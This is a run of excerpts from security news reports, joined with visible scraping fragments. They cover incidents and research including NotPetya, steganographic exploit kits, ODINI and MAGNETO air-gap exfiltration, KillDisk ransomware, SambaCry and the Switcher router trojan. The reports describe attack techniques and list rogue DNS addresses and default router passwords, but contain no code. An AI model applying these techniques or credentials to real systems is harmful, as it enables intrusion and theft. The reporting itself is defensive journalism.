recent timing and magnitude of the attack, in addition to our initial focus on restoring TNT operations and customer service functions, we are still evaluating the financial impact of the attack, but it is likely that it will be material,” FedEx said in a press statement. “We do not have cyber or other insurance in place that covers this attack. Although we cannot currently quantify the amounts, we have experienced loss of revenue due to decreased volumes at TNT and incremental costs associated with the implementation of contingency plans and the remediation of affected systems.” FedEx is not the only shipping company hit by NotPetya. Danish shipping giant A.P. Moller-Maersk also had its systems infected, which prevented it from accepting new orders. Maersk-owned APM Terminals, a global port and cargo inland services provider, was also affected, causing problems at major ports in the United States and Europe. According to Reuters, Maersk admitted that its antivirus software was not effective against the NotPetya malware, and the company now claims to have implemented additional security measures to prevent future incidents.

Steganography, the practice of hiding information within a file, has been increasingly used by malicious actors, including in the malvertising campaigns conducted recently by the AdGholas and GooNky groups. According to Trend Micro, GooNky has attempted to hide its malvertising traffic by appending malicious code to the end of image files. AdGholas has used a more sophisticated technique through the Astrum (Stegano) exploit kit. The attackers encoded a script in the alpha channel of an image. By abusing the alpha channel, which defines pixel transparency, cybercriminals could deliver their malicious code via rogue ads that looked like legitimate ads with a slightly different color. A similar technique has been observed in a Sundown update spotted by Trend Micro on December 27. This update attracted the attention of researchers as Sundown had previously not made an effort to hide its exploits. “In this updated version, the exploit kit’s malvertisement creates a hidden iframe that automatically connects to the Sundown landing page,” explained Trend Micro threat analysts. “The page will retrieve and download a white PNG image. It then decodes the data in this PNG file to obtain additional malicious code.” In the attacks analyzed by the security firm, cybercriminals used PNG images to disguise various exploits, including ones targeting Internet Explorer (CVE-2015-2419, CVE-2016-0189) and Flash Player (CVE-2016-4117). The updated version of Sundown has been used in several malvertising campaigns, with more than half of victims located in Japan, Canada, France and the United States. One of the pieces of malware delivered in these operations was the Chthonic banking Trojan. Sundown attracted the attention of researchers in August 2015, when it was the first to integrate an exploit for a recently patched Internet Explorer vulnerability. Following the disappearance of bigger players such as Angler, Nuclear, Neutrino and Magnitude, it has become one of the top exploit kits. One of the recent major campaigns leveraging Sundown – along with the RIG exploit kit – delivered CryLocker ransomware. In these attacks, cybercrooks used PNG files to exfiltrate information from infected systems. " }

Victims of Cryakl can potentially recover encrypted files with the Rakhni Decryptor available for free from Kaspersky Lab or NoMoreRansom. NoMoreRansom is a collaborative public/private project launched by Europol, the Dutch National Police, Kaspersky Lab and McAfee in July 2016. Its purpose is to help ransomware victims recover encrypted files through the use of decryptors. Since its launch, other national law enforcement agencies and additional private companies have joined the project. There are now 52 decryption tools available on the site, able to recover files from 84 ransomware families. The project now comprises more than 120 partners, including more than 75 private organizations. The Cypriot and Estonian police are the most recent law enforcement agencies to join, while KPN, Telenor and The College of Professionals in Information and Computing (CPIC) have joined as new private sector partners. Europol claims that the site has enabled more than 35,000 ransomware victims to recover their files without paying a ransom – preventing criminals from profiting from more than €10 million. The Rakhni Decryptor, developed by Kaspersky Lab, could already decrypt older versions of Cryakl – which first appeared in 2015. It could not, however, decrypt the latest version – which it now does. The Belgian Federal Computer Crime Unit (FCCU) learned that Belgian citizens had been victims of this new version of Cryakl. It was able to locate a C2 server in an unspecified neighboring country. The Netherlands is one neighbor state that is often used by criminals to host their malicious servers. “Led by the federal prosecutor's office,” announced Europol Thursday, “the Belgian authorities seized this and other servers while forensic analysis worked to retrieve the decryption keys.” Kaspersky Lab provided technical expertise, and has now included the recovered keys in its Rakhni Decryptor, uploaded on behalf of the Belgian authorities. The Rakhni Decryptor, says Kaspersky Lab, “Decrypts files affected by Rakhni, Agent.iih, Aura, Autoit, Pletor, Rotor, Lamer, Cryptokluchen, Lortok, Democry, Bitman (TeslaCrypt) version 3 and 4, Chimera, Crysis (versions 2 and 3), Jaff, Dharma and new versions of Cryakl ransomware.” The Belgian authorities are continuing their investigation into the operators of the seized C2 servers, but decided not to wait before making the recovered keys available to victims. It is, says Europol, “another successful example of how cooperation between law enforcement and internet security companies can lead to great results.” " }

However, malicious actors continue to improve their methods in an effort to evade detection. Security researcher Bart Blaze has come across a bogus invoice spam email apparently containing a Microsoft Word document (.doc). When the document is opened, if macros are not enabled, the user is instructed to enable macros in order to view the content. Once macros are enabled, the victim is presented with an image, while in the background a piece of malware is downloaded onto the computer. It’s worth noting that macros are disabled by default in Microsoft Office. Attaching malicious macros to documents is not uncommon, but the sample analyzed by Blaze is a bit different. The document is actually an MHTML, or a Multi-Purpose Internet Mail Extension (MIME) HTML file. MHTML (.mht) is a web page archive format used to combine HTML code and other resources (e.g. images, Java applets and Flash animations) in a single document. The malicious MHTML file contains an MSO object, which in turn contains an OLE object. When the file is launched, a VBS file is downloaded from Pastebin and executed. The VBS file is designed to download and execute a Trojan downloader, which in turn downloads a piece of malware. VirusTotal links provided by Blaze suggest that the final payload is a banking Trojan. The expert told SecurityWeek that the threat is very likely the notorious Dyre. The researcher has noted that attackers can build such malicious documents by creating an MHT file, appending the MSO object at the end, and renaming the resulting file with a .doc extension. The developer of olevba, a tool designed for the analysis of malicious macros hidden inside Microsoft Office documents, has pointed out that there is an even easier method. Cybercriminals can open a Word document with macros, save it as an MHTML from Word, and rename the file extension from .mht to .doc. Belgium-based researcher Didier Stevens, the developer of the OLE file analysis tool oledump, noted in a blog post that MSO files containing OLE files were previously seen in March, when cybercriminals were using XML Office documents to distribute the Dridex financial malware. “It seems obvious that malware authors are keeping up-to-date with the latest news and as such adapting their campaigns as well. Better be safe than sorry and don't trust anything sent via email,” Blaze advised in his blog post. “If you're in an organisation, you might want to consider blocking the execution of all macros (or only allow the ones that are digitally signed) by using GPO.” " }

But the level and sophistication of the attacks targeting the energy sector are more than enough to give the security community pause.   The threat landscape these companies are facing is the subject of a new paper from security firm Symantec, which takes a long look at the dangers circling the industry. Between July 2012 to June 2013, Symantec saw an average of 74 targeted attacks per day across the globe. Of these, nine attacks per day targeted the energy sector.   \"Accounting for 16.3 percent of all attacks, the energy sector was the second most targeted vertical in the last six months of 2012, with only the government/public sector exceeding it with 25.4 percent of all attacks,\" Symantec noted. \"The high ranking was mainly due to a major attack against a global oil company, which we observed in September 2012. However, in the first half of 2013 the energy sector continued to attract a high proportion of attacks, ranking in fifth place with 7.6 percent of targeted attacks.\"    The motivations and origins of attacks can vary, with both business and political rivalries playing a part. According to Symantec researcher Candid Wueest, it is not uncommon for rival companies to commission attacks against fellow corporations, and hacker-for-hire groups such as the 'Hidden Lynx' group are more than willing to participate. Next on the list are politically-minded hackers who sometimes work for foreign governments, he added.    \"State-sponsored hackers could target energy firms in an attempt to disable critical infrastructure,\" he noted. \"Hacktivist groups may also victimize companies to further their own political goals.\"   Typically, the attackers go after valuable information, but when the goal of the attack is sabotage, this might not be the case. Nevertheless, attacks focused on sabotage such as Stuxnet and Shamoon can still lead to significant financial losses for companies, and are often the work of state-sponsored agents or hacktivists, Symantec noted.    \"Fortunately, there have not been many successful sabotage attacks against energy companies to date,\" according to the paper. \"However, the increasing number of connected systems and centralized control for ICS systems means that the risk of attacks in the future will increase. Energy and utility companies need to be aware of these risks and plan accordingly to protect their valuable information as well as their ICS or SCADA networks.\"   \"Our research has found that modern energy systems are becoming more complex,\" blogged Wueest. \"There are supervisory control and data acquisition (SCADA) or industrial control systems (ICS) that sit outside of traditional security walls. And as smart grid technology continues to gain momentum, more new energy systems will be connected to the Internet of Things, which opens up new security vulnerabilities related to having countless connected devices.\"   \"In addition to this, many countries have started to open the energy market and add smaller contributors to the electric power grid, such as private water power plants, wind turbines or solar collectors,\" he continued. \"While these smaller sites make up only a small portion of the grid, the decentralized power input feeds can be a challenge to manage with limited IT resources and need to be carefully monitored to avoid small outages that could create a domino effect throughout the larger grid.\"   The paper can be downloaded here.

A team of researchers at the Ben-Gurion University of the Negev in Israel have created two types of proof-of-concept (PoC) malware that use magnetic fields generated by a device’s CPU to stealthily transmit data. A magnetic field is a force field created by moving electric charges (e.g. electric current flowing through a wire) and magnetic dipoles, and it exerts a force on other nearby moving charges and magnetic dipoles. The properties of a magnetic field are direction and strength. The CPUs present in modern computers generate low frequency magnetic signals which, according to researchers, can be manipulated to transmit data over an air gap. The attacker first needs to somehow plant a piece of malware on the air-gapped device from which they want to steal data. The Stuxnet attack and other incidents have shown that this task can be accomplished by a motivated attacker. Once the malware is in place, it can collect small pieces of information, such as keystrokes, passwords and encryption keys, and send it to a nearby receiver. The malware can manipulate the magnetic fields generated by the CPU by regulating its workload – for example, overloading the processor with calculations increases power consumption and generates a stronger magnetic field. The collected data can be modulated using one of two schemes proposed by the researchers. Using on-off keying (OOK) modulation, an attacker can transmit “0” or “1” bits through the signal generated by the magnetic field – the presence of a signal represents a “1” bit and its absence a “0” bit. Since the frequency of the signal can also be manipulated, the malware can use a specific frequency to transmit “1” bits and a different frequency to transmit “0” bits. This is known as binary frequency-shift keying (FSK) modulation. Ben Gurion University researchers have developed two pieces of malware that rely on magnetic fields to exfiltrate data from an air-gapped device. One of them is called ODINI and it uses this method to transmit the data to a nearby magnetic sensor. The second piece of malware is named MAGNETO and it sends data to a smartphone, which typically have magnetometers for determining the device’s orientation. In the case of ODINI, experts managed to achieve a maximum transfer rate of 40 bits/sec over a distance of 100 to 150 cm (3-5 feet). MAGNETO is less efficient, with a rate of only 0.2 - 5 bits/sec over a distance of up to 12.5 cm (5 inches). Since transmitting one character requires 8 bits, these methods can be efficient for stealing small pieces of sensitive information, such as passwords. Researchers demonstrated that ODINI and MAGNETO also work if the targeted air-gapped device is inside a Faraday cage, an enclosure used to block electromagnetic fields, including Wi-Fi, Bluetooth, cellular and other wireless communications. In the case of MAGNETO, the malware was able to transmit data even if the smartphone was placed inside a Faraday bag or if the phone was set to airplane mode.   Ben-Gurion researchers have found several ways of exfiltrating data from air-gapped networks, including through infrared cameras, router LEDs, scanners, HDD activity LEDs, USB devices, the noise emitted by hard drives and fans, and heat emissions.

According to statistics from Symantec, Australia has experienced a surge of attacks since May. During that timeframe there has been an increase of more than 1,300 percent in the occurrence of malware families such as Cryptolocker, Cryptodefense and Cryptowall. Globally, it increased approximately 14-fold during the same period.    \"Cryptomalware is a particularly insidious form of threat that encrypts data files on the compromised computer and then attempts to extort money from the victim in order to have the files restored,\" according to Symantec's Security Response team. \"Since many of us use personal computers to create and store documents for study or work, as well as media files of precious memories, the loss of these files can be particularly painful. This is what makes this form of extortion so effective for the criminal perpetrators.\"   Recent examples of cryptomalware affecting Australian users tend to be from the Trojan.Cryptolocker.F family, explained Symantec.   \"This particular threat propagates through email-based social engineering tricks,\" the team noted. \"These tricks are tailored to the geographic region in which the attacks are being performed, but they all follow a similar modus operandi. In Australia, users are sent emails that typically look like they came from local companies such as an Australian energy supplier (view a bill) or an Australian postal delivery company (details of parcel delivery).\"   The attacks typically work this way: the victim receives an email telling them about an offer, bill or parcel delivery. The email asks the user to click a link to get the details or print out a label. Once the link is clicked, the user is presented with a legitimate-looking web page associated with the scam's theme. The page contains a CAPTCHA code designed for the user to enter so that the attacker knows it is an actual person viewing the webpage.   Once the code is entered, the user is offered a zip file to download and open that is supposed to contain a document but actually holds an .exe file. If the file is downloaded and opened, the malware is executed and begins to search for data files before encrypting them. Once the files are encrypted the victim is presented a message announcing the infection and demanding payment.   \"Cryptomalware is an increasingly common menace that is spreading throughout the world,\" according to Symantec. \"The techniques used, however, are not particularly sophisticated. Users should remain vigilant to the threat that cryptomalware poses and take precautions to avoid suffering the consequences of an infection.\" " }

Dubbed Jellyfish, the proof-of-concept malware leverages the LD_PRELOAD technique from the Jynx Linux rootkit and OpenCL, a low-level API developed by Khronos for heterogeneous computing. According to the developers of Jellyfish, who call themselves Team Jellyfish, one of the main advantages of GPU-based malware is that it’s more likely to evade detection due to the lack of malware analysis tools for such threats. Another advantage is that this type of malware can “snoop” on the CPU host memory via direct memory access (DMA). Additionally, the GPU is fast and the malicious code remains in its memory even after the device is shut down, the developers said. The experimental Jellyfish malware is currently designed to run on computers with AMD and NVIDIA graphics cards, but Intel products are also supported through the AMD APP Software Development Kit (SDK). OpenCL drivers must be installed on the system for the rootkit to work. Another PoC malware developed by Team Jellyfish is a keylogger called Demon. The developers say Demon has been built using information from a paper published in 2013 by researchers at Columbia University. The paper describes a stealthy keylogger that runs directly on a graphics processor. “We are not associated with the creators of this paper. We only PoC'd what was described in it, plus a little more,” the developers of Demon noted. While for the Jellyfish rootkit the developers use the LD_PRELOAD variable to hide malicious components, in the case of Demon they say they are using code injection. Team Jellyfish claims that their creations are designed for educational purposes, and that their goal is to “make everyone aware that GPU-based malware is real.” They noted that Jellyfish and Demon are currently only in beta version and they still have a lot of bugs. Malware that uses the GPU is not unheard of. Over the past years, researchers have spotted several threats that leverage an infected device’s GPU to mine Bitcoins. However, Jellyfish and Demon are more interesting because they use the GPU for more than just its processing power. It remains to be seen if the code published by Team Jellyfish will be used by malicious actors in their operations. " }

Since KillDisk has been used in attacks aimed at industrial control systems (ICS), experts are concerned that threat actors may be bringing ransomware into the industrial domain. Previous versions of KillDisk wiped hard drives in an effort to make systems inoperable, but a new variant observed by industrial cyber security firm CyberX encrypts files using a combination of RSA and AES algorithms. Specifically, each file is encrypted with an individual AES key and these keys are encrypted using an RSA 1028 key stored in the body of the malware. CyberX VP of research David Atch told SecurityWeek that the KillDisk variant they have analyzed is a well-written piece of ransomware. The code is similar to earlier samples and its functionality is nearly the same. The ransomware is designed to encrypt various types of files, including documents, databases, source code, disk images, emails and media files. Both local partitions and network folders are targeted. Victims are instructed to pay 222 bitcoins ($210,000) to recover their files, which experts believe suggests that the attackers are targeting “organizations with deep pockets.” The contact email address provided to affected users is associated with Lelantos, a privacy-focused email provider only accessible through the Tor network. The Bitcoin address to which victims are told to send the ransom has so far not made any transactions.  Atch pointed out that the same RSA public key is used for all samples, which means that a user who receives a decryptor will likely be able to decrypt files for all victims. According to CyberX, the malware requires elevated privileges and registers itself as a service. The threat terminates various processes, but it avoids critical system processes and ones associated with anti-malware applications, likely to avoid disrupting the system and triggering detection by security products. “Important thing to notice about the malware, the author/s are familiar with the crypto API, they are using some of it’s functions to generate truly random numbers,” Atch explained. “But they decided to avoid using the function CryptDecrypt, probably because this function can be easily hooked. Hooking the function may provide an Anti-Malware software an easy way of dealing with unwanted file encryption, the hooking will provide an ability to restore the keys.” KillDisk evolution to ransomware Earlier this month, security firm ESET published a report detailing attacks conducted by a threat group dubbed TeleBots. Researchers believe TeleBots is an evolution of the Russia-linked BlackEnergy (Sandworm) group, which is said to be responsible for several attacks on ICS/SCADA systems, including the December 2015 operation aimed at Ukraine’s energy sector. One of the tools used by the BlackEnergy actor is KillDisk, a piece of malware originally designed to delete files and make systems inoperable. In the attacks that caused power outages in Ukraine, KillDisk was used to make it more difficult for affected power companies to restore service. In recent cyber-sabotage campaigns launched against high-value targets in Ukraine’s financial sector, TeleBots used various tools, including a new version of KillDisk. This malware, used in the final stages of the attack, was executed with high privileges on servers and workstations after attackers likely obtained administrator credentials in the previous stages of the operation. In these attacks, KillDisk was configured to activate at a predefined date and time. In addition to deleting important system files, it was set up to overwrite files with certain extensions – largely the same types that the ransomware variant encrypts. CyberX believes threat actors turned KillDisk into a piece of ransomware because, unlike cyber-sabotage, the new functionality enables them to directly monetize their attacks. Experts pointed out that industrial organizations can be an ideal target for ransomware for several reasons, including the fact that cyber-disruptions can result in physical safety risks and production outages, network operations typically cannot be easily shut down, data backup processes may not cover all the required data, and the employees of industrial organizations might be less aware of cyber threats. “Enterprises are more likely to quietly pay the ransom because of concerns that going public with cyberattacks will invite greater scrutiny from regulators, and possibly fines (environmental, safety, etc.),” said Phil Neray, VP of industrial cybersecurity at CyberX.

The activities of the DarkHotel advanced persistent threat (APT) actor came to light in November 2014, when Kaspersky published a report detailing a sophisticated cyber espionage campaign targeting business travelers in the Asia-Pacific region. The group has been around for nearly a decade and some researchers believe its members are Korean speakers. The attackers targeted their victims using several methods, including through their hotel’s Wi-Fi, zero-day exploits and peer-to-peer (P2P) file sharing websites. Nearly one year later, the threat group was observed using new attack techniques and an exploit leaked from Italian spyware maker Hacking Team. DarkHotel victims have been spotted in several countries, including North Korea, Russia, South Korea, Japan, Bangladesh, Thailand, Taiwan, China, the United States, India, Mozambique, Indonesia and Germany. Up until recently, the attacks appeared to focus on company executives, researchers and development personnel from sectors such as defense industrial base, military, energy, government, NGOs, electronics manufacturing, pharmaceutical, and medical. In more recent DarkHotel attacks it has dubbed “Inexsmar,” security firm Bitdefender said the hackers targeted political figures, and they appeared to be using some new methods. Bitdefender’s analysis is based on samples from September 2016. The initial Trojan downloader, delivered via phishing emails, collects information on the infected device and sends it back to its command and control (C&C) server. If the compromised system meets requirements (i.e. it belongs to an individual who is of interest), the first stage DarkHotel downloader, disguised as a component of OpenSSL, is fetched. In the meantime, in an effort to avoid raising suspicion, the malware opens a document titled “Pyongyang e-mail lists - September 2016,” which provides a list of email contacts for various organizations in North Korea’s capital city. If the system profile does not match what the attackers are looking for, the C&C server returns a “fail” string and the attack stops. If the attack continues, a second payload is retrieved. When Bitdefender analyzed the malware samples, the C&C server was offline, making it impossible to know exactly who the victims were and how much damage was caused. However, Bitdefender’s Bogdan Botezatu told SecurityWeek that, based on the structure of the phishing message, the intended targets are most likely individuals working for governments or state institutions who have an interest in the political situation in North Korea. Experts believe that the use of social engineering and a multi-stage downloader is an improvement compared to the direct use of exploits as it gives the attackers more flexibility in malware distribution and ensures that the Trojan remains up to date.

In the first half of 2017, Zscaler’s products blocked roughly 600,000 threats hidden in encrypted traffic every day, but that number grew to 800,000 in the second half of the year, which represents an increase of 30 percent. Malicious actors have used SSL-encrypted channels for the initial delivery of malvertising, phishing and compromised websites, to distribute malware payloads and exploits, and for communications between the infected host and command and control (C&C) servers. In the case of phishing attempts, Zscaler saw a 400 percent increase in the first half of 2017 compared to 2016. Overall, in 2017, phishing activity jumped by nearly 300 percent. Phishing pages served over HTTPS are either hosted on a compromised website that has an SSL certificate, or they are hosted on malicious sites that imitate well-known brands and rely on certificates obtained by the cybercriminals themselves. Services such as Let’s Encrypt make it easier for malicious actors to obtain free certificates that they can use in their operations.  In the case of malware attacks, Zscaler said SSL/TLS channels were used 60 percent of the time to deliver banking Trojans throughout 2017, and ransomware was spotted in one-quarter of attempts. Many attackers obtained an encrypted distribution channel for their malware by hosting it on legitimate services such as Box, Dropbox, Google and AWS. An analysis of roughly 6,700 SSL transactions blocked by Zscaler showed that a majority of abused certificates belonged to legitimate sites that had been compromised. The security firm also found that the types of certificates that are most abused by cybercriminals are domain validated (DV) certificates, which have a validity of three months and are obtained more easily. DV certificates, particularly ones obtained for free, were spotted in 75 percent of cases. More than half of certificates were valid for less than one year, and roughly one-third of those had a validity period of three months or less. " }

The attackers have apparently targeted by people they know use Bitcoin by scraping popular BTC sites for email addresses, LogRhythm's Greg Foss explained in a blog post.   A link in the email redirects to a site and downloads the file 'Backup.zip.' Analyzing the metrics around the malicious link show that roughly 2,000 users have clicked on the link since the malware campaign was launched Jan. 6.   \"A majority of the clicks were through unknown sources, most likely e-mail, though other sources such as Reddit were also used to propagate the attack,\" Foss blogged. \"After extracting the contents and running the files through some quick analysis, it is apparent that each file plays a significant role in the overall attack. They anticipate that the user will open Passwords.txt.lnk first, and then view wallet.dat, as only these two files are visible unless ‘show hidden files’ is turned on in Windows.

In October, attackers stole $1 million in bitcoins from Inputs.io. More recently, the malware attack that hit Yahoo users in Europe earlier this month was designed to create a large network of machines for bitcoin mining.   In the attack discovered by LogRhythm, the malware appears to lay dormant on the machine until the victim opens their bitcoin wallet using the BitcoinQT software.   \"This is the obvious intended target, as the malware is hard-coded for windows hosts and the screenshot included in the .zip file suggests the use of BitcoinQT by showing a screenshot of the included wallet.dat file which happens to contain a very tempting ~30 BTC,\" Foss blogged.   \"Once BitcoinQT.exe is opened, the software appears to connect back to the attacker’s network, however it is difficult to tell immediately which IP addresses are related to the malware, though this is only one potential avenue,\" he added.

Of the top affiliates for each program, the most popular browser plugins such as ShopperPro, PlusHD and Yontoo. The injected ads hit the user's machine in a number of ways. In the report, the researchers found 50,870 Chrome extensions and more than 34,000 software applications served as unwanted ad injectors. \"Upwards of 30% of these packages were outright malicious and simultaneously stole account credentials, hijacked search queries, and reported a user’s activity to third parties for tracking,\" blogged Kurt Thomas of Google. \"In total, we found 5.1% of page views on Windows and 3.4% of page views on Mac that showed tell-tale signs of ad injection software.\" \"Next, this software is distributed by a network of affiliates that work to drive as many installs as possible via tactics like: marketing, bundling applications with popular downloads, outright malware distribution, and large social advertising campaigns,\" he blogged. \"Affiliates are paid a commission whenever a user clicks on an injected ad. We found about 1,000 of these businesses, including Crossrider, Shopper Pro, and Netcrawl, that use at least one of these tactics.\" The researchers also found that ad injectors source their ads from about 25 businesses that offer injection libraries. Superfish and Jollywallet are by far the most popular of these, and appeared in 3.9 percent and 2.4 percent of Google views, respectively. \"The ad injection ecosystem profits from more than 3,000 victimized advertisers—including major retailers like Sears, Walmart, Target, Ebay—who unwittingly pay for traffic to their sites,\" blogged Thomas. \"Because advertisers are generally only able to measure the final click that drives traffic to their sites, they’re often unaware of many preceding twists and turns, and don’t know they are receiving traffic via unwanted software and malware. Ads originate from ad networks that translate unwanted software installations into profit: 77% of all injected ads go through one of three ad networks—dealtime.com, pricegrabber.com, and bizrate.com. Publishers, meanwhile, aren’t being compensated for these ads.\" In response to the situation, Google has removed 192 deceptive Chrome extensions that affected 14 million users with ad injection from the Chrome Web Store. The company also added improved protections in Chrome to detect unwanted software and reached out to the advertisers affected by ad injection to alert them about deceptive practices and the ad networks involved, blogged Thomas.  " }

According to researchers, the attack starts with an email which informs recipients that their employment with the company they work for has been terminated due to policy violations. To make everything more legitimate-looking, the name of the targeted company may be featured in both the subject line and the body of the email, Bitdefender Security Specialist Bianca Stanescu told SecurityWeek. The name of the file that's attached to the phony emails can contain strings like \"infringement,\" \"interruption,\" \"breach,\" \"infraction,\" \"violation,\" \"term\" or \"disturbance.\" What's interesting about the attachment is that it's not a .ZIP file like in many other spam runs. Instead, the attackers are using the ARJ file archiver. \"ARJ-compressed files used to distribute malicious attachments are just starting to become popular and many zip file software programs can easily open them,\" explained Adrian Miron, anti-spam researcher at Bitdefender. \"Because the compression system is rarely used, spammers very well may think of it as a new method to avoid being detected by traditional security software or email filters.\" Once the attached file is decompressed and executed, the malware drops and opens a clean RTF document containing information on discipline programs and company policy violations.  The threat connects to German, Brazilian or French websites, after which it starts communicating with its command and control (C&C) server to receive further instructions from the attackers. The notorious Zeus (Zbot) Trojan, which enables cybercriminals to steal banking information and login credentials from infected devices, is then downloaded onto infected machines.  Bitdefender has seen several Trojans being attached to the bogus emails. One of them is the downloader detected by the security firm as Trojan.Agent.BFIO. At the time of writing, only 20 of the 53 antivirus engines from VirusTotal detect the threat based on its signature.  The spam emails originate in countries such as Spain, Korea, Germany, the United States, the United Kingdom, France, Italy, Russia, Portugal and Saudi Arabia. Bitdefender experts point out that servers in various countries are most likely abused by the cybercrooks in an effort to avoid being tracked down by law enforcement. According to Stanescu, most of the targeted companies are located in the United Kingdom, the United States and Germany. The security firm has detected and blocked several hundred infections so far. In addition to the fake job termination emails, the attackers are also leveraging \"overdue invoice\" and \"fax\" spam messages using similar social engineering techniques to distribute the malware. Such attacks represent a serious threat to SMBs, especially with the rise of the bring-your-own-device (BYOD) trend. Recent studies show that many small and medium enterprises allow their employees to access virtual private networks (VPNs) from their personal mobile devices. A study conducted by Bitdefender earlier this year revealed that 18% of SMBs had still been using Windows XP even after Microsoft ended support for it.   " }

Dubbed “Switcher,” the malware has been disguised as an Android client for the Chinese search engine Baidu, and a Chinese app for sharing Wi-Fi network details. Once users install one of these apps, the malware attempts to guess the username and password of the Wi-Fi router the infected Android device is connected to. Switcher includes a list of more than two dozen username and password combinations that could allow it to access the router’s web administration interface, such as admin:admin, admin:123456, or admin:00000000. “With the help of JavaScript it tries to login using different combinations of logins and passwords. Judging by the hardcoded names of input fields and the structures of the HTML documents that the trojan tries to access, the JavaScript code used will work only on web interfaces of TP-LINK Wi-Fi routers,” Nikita Buchka, mobile security expert at Kaspersky Lab, said in a blog post. If the web administration interface can be accessed, the Trojan replaces the device’s primary and secondary DNS servers with IP addresses pointing to rogue DNS servers. These addresses are 101.200.147.153, 112.33.13.11 and 120.76.249.59 – one is the default option, while the other two are set for specific ISPs. “The code that performs these actions is a complete mess, because it was designed to work on a wide range of routers and works in asynchronous mode,” Buchka noted. With the router’s DNS settings pointing to a machine controlled by the attackers, traffic gets redirected to malicious websites instead of the legitimate site the victim is trying to access. According to Kaspersky, the cybercriminals claim to have compromised nearly 1,300 websites, mainly in China. “The Trojan targets the entire network, exposing all its users, whether individuals or businesses, to a wide range of attacks - from phishing to secondary infection,” said Buchka. “A successful attack can be hard to detect and even harder to shift: the new settings can survive a router reboot, and even if the rogue DNS is disabled, the secondary DNS server is on hand to carry on.” Related Reading: Malvertising Campaign Targets Routers Related Reading: Multiple Vulnerabilities Impact ZyXEL Customized Routers " }

The Samba flaw exploited in these attacks, tracked as CVE-2017-7494 and known as SambaCry and EternalRed, can be exploited by a malicious client to upload a shared library to a writable share, and then cause the server to load that library. This allows a remote attacker to execute arbitrary code on the targeted system. The security hole was introduced in the Samba code in 2010 and it was patched in May. Since the Samba interoperability software suite is highly popular, the vulnerability affects the products of several major vendors, including NAS appliances. Roughly two weeks after the patch was released, security firms noticed that the vulnerability had been exploited to deliver a cryptocurrency miner. In early July, researchers at Trend Micro spotted another type of attack involving SambaCry. Cybercriminals have been exploiting the vulnerability in attacks targeting NAS devices used by small and medium-size businesses. The malware they have been using works on various architectures, including MIPS, ARM and PowerPC. Attackers can leverage the Shodan Internet search engine to identify devices using Samba and write the initial malware files to their public folders. According to Trend Micro, ELF_SHELLBIND.A is delivered as a SO file to Samba public folders and loaded via the SambaCry vulnerability. Once it’s deployed on the targeted system, the malware contacts a command and control (C&C) server located in East Africa. The threat modifies firewall rules to ensure that it can communicate with its server. “Once the connection is successfully established and authentication is confirmed, then the attacker will have an open command shell in the infected systems where he can issue any number of system commands and essentially take control of the device,” explained Trend Micro researchers. Users can protect their systems against these attacks by ensuring that Samba is up to date. Another mitigating factor is the need to have writable access to a shared location on the targeted system.

The attacks have targeted the company's managed security services customers during the past three weeks, and have been leveraging CVE-2012-1823 to infect Internet-facing web servers. Only Linux webservers running out-of-date versions of PHP are vulnerable. As of Jan. 6, more than 60 Security Operations Center customers have been affected by the exploit attempts.   \"There is no clear correlation between this activity and any individual industry vertical, with customers in health, financial, telecommunications, local government, and more being affected,\" according to Symantec's MSS Global Threat Response blog. \"The main driver behind these exploits is to compromise and infect the victim webserver for financial gain. Binaries were extracted from the malicious servers utilized in the attack, revealing primarily bitcoin mining malware. Bitcoins are a virtual currency which is generated based on mathematical operations known as ‘mining’ on computer hardware.\"   Attackers often infect machines with the intent of using them to generate bitcoins for financial gain, the company added. Researchers also linked the attack to a Linux worm targeting embedded devices.  \"There’s no clear trend or geographic breakdown of source addresses that would lend itself to attribution,\" according to Symantec. \"Due to the nature of the attack, return traffic to the source host is not required.

Over a dozen law enforcement agencies from Europe, the US and Australia took part in a joint campaign carried out in September 2017 – details are made public only now due to operational reasons. Authorities in the United Kingdom learned of Luminosity, also known as LuminosityLink, back in September 2016 when they arrested an individual suspected of hacking-related offences as part of a separate investigation. That individual’s arrest led to an international operation that, according to Europol and the NCA, resulted in Luminosity no longer being available and no longer working for those who purchased it. Since September, law enforcement agencies executed arrests, search warrants, and cease and desist notifications across Europe, America and Australia, targeting both sellers and users of Luminosity. The NCA said a small network of individuals in the UK was responsible for the distribution of the remote access trojan (RAT) to more than 8,600 buyers across 78 countries. Luminosity first emerged in May 2015 and it had been available for purchase for as little as $40. The RAT allowed hackers to easily take complete control of infected computers, including disable security software, log keystrokes, steal passwords and other data, and spy on victims via the device’s webcam. Luminosity RAT was one of the pieces of malware used last year by Nigerian cybercriminals in attacks aimed at industrial firms. Investigators have identified passwords, photos, videos and other data stolen from thousands of victims, but the number is expected to increase significantly as devices seized from suspects continue to be analyzed. The NCA said police seized more than 100 devices during the operation in the UK. “The sale and deployment of this hacking tool were uncovered following a single arrest and the subsequent forensic examination of the computer,” said Detective Inspector Ed Heath, head of the South West Regional Cyber Crime Unit, which led the investigation. “More than a year’s complex work with international policing partners led us to identify a large number of offenders.” " }

Named HighRise, the version of the malware described in the WikiLeaks document is disguised as an app called TideCheck, and it only works on Android versions between 4.0 and 4.3. According to its developers, the tool must be manually downloaded, installed and activated on the targeted device – this means that the attacker needs to have physical access to the smartphone or trick victims into installing it themselves. The second scenario is less likely as activating the app requires the user to open the TideCheck app, enter the “inshallah” password (the Arabic expression for “God willing”), and select the “Initialize” option from the menu. The document shows that the app will automatically run in the background after a reboot once it has been manually activated. HighRise can be used to proxy incoming SMS messages received by the compromised device to a remote server. The tool also includes functionality for sending messages to the server via a secure communications channel. A different interpretation of the leaked document by The Hacker News suggests that HighRise is actually installed on the CIA operative’s phone and it proxies SMS messages from malware-infected smartphones to the agency’s servers. As the user guide describes it, the tool provides greater separation between the targeted devices and the CIA’s servers. The user guide leaked by WikiLeaks is for version 2.0 of HighRise and it’s dated December 2013. Google has made numerous security improvements to the Android operating system since version 4 – the latest version is Android 7 Nougat – and malware such as HighRise may no longer work without significant updates. On the other hand, cybercriminals have been keeping up with the improvements and they still manage to create profitable Android malware. Furthermore, given that HighRise requires a significant amount of user interaction, it’s possible that this or other similar projects are still successfully utilized by the CIA. Over the past months, WikiLeaks has described several “Vault 7” tools allegedly used by the agency. The most recent leaks detail malware designed for redirecting traffic on Linux systems (OutlawCountry), stealing SSH credentials (BothanSpy), spreading malware on an organization’s network (Pandemic), locating people via their device’s Wi-Fi (Elsa), hacking routers and access points (Cherry Blossom), and accessing air-gapped networks (Brutal Kangaroo). *Updated with information from The Hacker News " }

